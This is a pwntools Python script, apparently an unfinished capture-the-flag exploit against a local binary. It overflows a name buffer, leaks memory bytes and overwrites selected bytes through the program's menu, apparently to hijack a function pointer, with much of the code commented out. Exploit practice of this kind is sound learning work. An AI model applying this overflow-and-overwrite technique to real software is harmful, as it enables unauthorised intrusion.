from pwn import *
import time

LOCAL = True
if LOCAL:
    r = process('./challenge')
r.sendafter("Name: ", "A" * 0x7f)
r.sendafter("> ", "5")
r.sendlineafter("replace: ", "C") # this doesn't accept getchar for some reason
r.sendlineafter("char: ", "C")
r.sendafter("> ", "4")
leak = r.recvline()[-4:]
print(leak)

""" for i,v in enumerate(leak): """
"""     r.sendafter("> ", "5") """
"""     r.sendlineafter("replace: ", v.to_bytes(1, byteorder="big")) """
"""     r.sendlineafter("char: ", b'D') """


for i in range(4):
    r.sendlineafter("> ", "5")
    r.sendlineafter("replace: ", chr(i + ord('E')))
    r.sendlineafter("char: ", chr(i + ord('E')))

# replacing calc
""" r.sendafter("> ", "5") """
""" r.sendlineafter("replace: ", "Z") """
""" r.sendlineafter("char: ", "Z") """
""" r.sendafter("> ", "5") """
""" r.sendlineafter("replace: ", "Z") """
""" r.sendlineafter("char: ", "Z") """
""" r.sendafter("> ", "5") """
""" r.sendlineafter("replace: ", "Z") """
""" r.sendlineafter("char: ", "Z") """

r.sendafter("> ", "5")
r.sendlineafter("replace: ", b'\x0d')
r.sendlineafter("char: ", b'\x0c')
r.sendafter("> ", "5")
r.sendlineafter("replace: ", b'\x6b')
r.sendlineafter("char: ", b'\xf3')
gdb.attach(r)
time.sleep(1)

""" r.interactive() """
print("sent 2")
r.sendlineafter("> ", "1")
print(r.recvline())



#r.sendlineafter("> ", "4") 
#leak2 = r.recvline()[-4:] 
#print(leak2) 
#print(leak2[1].to_bytes(1,"big")) 


""" print(leak2[2].to_bytes(1,"big")) """


""" r.interactive() """


